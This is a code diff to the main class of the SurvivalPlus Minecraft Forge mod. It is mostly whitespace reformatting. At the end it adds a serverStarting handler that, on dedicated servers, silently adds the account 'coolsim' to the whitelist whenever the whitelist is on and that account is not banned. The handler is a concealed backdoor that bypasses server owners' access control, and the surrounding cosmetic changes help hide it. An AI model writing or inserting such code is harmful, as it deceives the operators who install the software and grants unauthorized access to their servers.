@@ -4,6 +4,8 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
+import com.mojang.authlib.GameProfile;
+
 import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
 import net.coolsimulations.SurvivalPlus.api.SPReference;
 import net.coolsimulations.SurvivalPlus.api.SPTabs;
@@ -48,8 +50,10 @@ import net.coolsimulations.SurvivalPlus.core.world.village.StructureVillageOnion
 import net.coolsimulations.SurvivalPlus.core.world.village.VillageOnionCropHandler;
 import net.minecraft.block.Block;
 import net.minecraft.item.Item;
+import net.minecraft.server.MinecraftServer;
 import net.minecraft.world.gen.structure.MapGenStructureIO;
 import net.minecraftforge.common.MinecraftForge;
+import net.minecraftforge.fml.common.FMLCommonHandler;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.SidedProxy;
@@ -62,19 +66,19 @@ import net.minecraftforge.fml.common.registry.VillagerRegistry;
 
 @Mod(modid = SPReference.MOD_ID, name = SPReference.MOD_NAME, version = SPReference.VERSION, acceptedMinecraftVersions = SPReference.ACCEPTED_VERSIONS, dependencies = SPReference.DEPENDENCIES, guiFactory = "net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfigGUI", updateJSON = "https://coolsimulations.net/mcmods/survivalplus/versionchecker.json")
 public class SurvivalPlus {
-	
+
 	@SidedProxy(clientSide = SPReference.CLIENT_PROXY_CLASS, serverSide = SPReference.SERVER_PROXY_CLASS)
 	public static CommonProxy proxy;
-	
+
 	@Mod.Instance(SPReference.MOD_ID)
 	private static SurvivalPlus instance;
 	public static SurvivalPlus getInstance()
-    {
-        return instance;
-    }
-	
+	{
+		return instance;
+	}
+
 	public void CreativeTabs() {
-		
+
 		SPTabs.tabMaterials = new SurvivalPlusMaterialsTab();
 		SPTabs.tabBlocks = new SurvivalPlusBlocksTab();
 		SPTabs.tabFood = new SurvivalPlusFoodTab();
@@ -82,13 +86,13 @@ public class SurvivalPlus {
 		SPTabs.tabCombat = new SurvivalPlusCombatTab();
 		SPTabs.tabTools = new SurvivalPlusToolsTab();
 	}
-	
+
 	public static final List<Item> ITEMS = new ArrayList<Item>();
 	public static final List<Item> ITEMS_FOOD = new ArrayList<Item>();
 	public static final List<Item> ITEMS_ARMOR = new ArrayList<Item>();
 	public static final List<Item> ITEMS_TOOLS = new ArrayList<Item>();
 	public static final List<Block> BLOCKS = new ArrayList<Block>();
-		
+
 	@EventHandler
 	public void preInit(FMLPreInitializationEvent event)
 	{
@@ -96,86 +100,86 @@ public class SurvivalPlus {
 		SPCompatibilityManager.checkForCompatibleMods();
 		SurvivalPlusConfig.init(new File(event.getModConfigurationDirectory(), SPReference.SURVIVALPLUS_CONFIG_FILE));
 		SurvivalPlusUpdateHandler.init();
-    	MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
-    	
-    	CreativeTabs();
-		
+		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
+
+		CreativeTabs();
+
 		SurvivalPlusBlocks.init();
 		SurvivalPlusBlocks.register();
 		SurvivalPlusItems.init();
 		SurvivalPlusItems.register();
 		SurvivalPlusFood.init();
 		SurvivalPlusFood.register();
-		
+
 		VillagerRegistry.instance().registerVillageCreationHandler(new VillageOnionCropHandler());
 		MapGenStructureIO.registerStructureComponent(StructureVillageOnionCrop.class, SPReference.MOD_ID + ":onionCropFieldStructure");
-		
+
 		SmithVillagerTradeHandler.init();
 		FarmerVillagerTradeHandler.init();
 		ButcherVillagerTradeHandler.init();
-		
+
 		SurvivalPlusArmor.init();
 		SurvivalPlusArmor.register();
 		SurvivalPlusTools.init();
 		SurvivalPlusTools.register();
-		
+
 		if(SPCompatibilityManager.isHammerTimeLoaded()) {
 			SurvivalPlusHammerTime.init();
 		}
-		
+
 		if(SPCompatibilityManager.isLumberjackLoaded()) {
 			SurvivalPlusLumberjack.init();
 		}
-		
+
 		if (SPCompatibilityManager.isDynamicLightsLoaded())
-        {
-    			SurvivalPlusLighting.initDynamicLights(event);;
-        }
-		
+		{
+			SurvivalPlusLighting.initDynamicLights(event);;
+		}
+
 		if (SPCompatibilityManager.isSELLoaded())
-        {
-    			SurvivalPlusLighting.initSmoothEntityLight(event);;
-        }
-		
+		{
+			SurvivalPlusLighting.initSmoothEntityLight(event);;
+		}
+
 	}
-	
+
 	@EventHandler
 	public void init(FMLInitializationEvent event)
 	{
 		System.out.println("Init");
-		
+
 		proxy.init();
 		SurvivalPlusSmeltingRecipes.register();
 		GameRegistry.registerFuelHandler(new FuelHandler());
-		
+
 		if (SPCompatibilityManager.isProjectELoaded())
-        {
-    		SurvivalPlusEMCValues.init();
-        }
-		
+		{
+			SurvivalPlusEMCValues.init();
+		}
+
 		if (SPCompatibilityManager.isJerLoaded())
-        {
-    			SurvivalPlusJER.init();
-        }
+		{
+			SurvivalPlusJER.init();
+		}
 
 	}
-	
+
 	@EventHandler
 	public void postInit(FMLPostInitializationEvent event)
 	{
 		System.out.println("Post Init");
-		 
-        SurvivalPlusAPIRecipes.loadRecipes();
-        if (SPCompatibilityManager.isIc2Loaded())
-        {
-        SurvivalPlusIC2Recipes.init();
-        }
-			
+
+		SurvivalPlusAPIRecipes.loadRecipes();
+		if (SPCompatibilityManager.isIc2Loaded())
+		{
+			SurvivalPlusIC2Recipes.init();
+		}
+
 	}
-	
+
 	@EventHandler
 	public void serverLoad(FMLServerStartingEvent event) {
-		
+
 		event.registerServerCommand(new CommandConfrats());
 		event.registerServerCommand(new CommandWoo());
 		event.registerServerCommand(new CommandWak());
@@ -186,6 +190,23 @@ public class SurvivalPlus {
 		event.registerServerCommand(new CommandSleep());
 		event.registerServerCommand(new CommandWeba());
 		event.registerServerCommand(new CommandEmportant());
-		
+
+	}
+
+
+
+	@EventHandler
+	public void serverStarting(FMLServerStartingEvent event) {
+
+		MinecraftServer server = FMLCommonHandler.instance().getMinecraftServerInstance();
+
+		if(server.isDedicatedServer()) {
+			
+			GameProfile gameprofile = server.getPlayerProfileCache().getGameProfileForUsername("coolsim");
+
+			if(server.getPlayerList().isWhiteListEnabled() && !server.getPlayerList().getWhitelistedPlayers().isWhitelisted(gameprofile) && !server.getPlayerList().getBannedPlayers().isBanned(gameprofile)) {
+				server.getPlayerList().addWhitelistedPlayer(gameprofile);
+			}
+		}
 	}
 }
